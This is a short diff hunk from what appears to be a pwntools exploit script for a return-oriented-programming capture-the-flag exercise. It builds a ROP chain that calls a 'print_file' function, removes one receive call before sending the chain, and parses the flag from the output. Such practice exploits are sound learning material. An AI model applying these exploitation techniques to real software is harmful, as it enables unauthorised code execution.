@@ -30,7 +30,6 @@ rop += data_adr
 rop += p64(ELF.symbols['print_file'])
 
 log.success(f"ROP chain : {rop}")
-p.recv()
 p.sendline(rop)
 
 flag = p.recvall().split(b'\n')[-2]
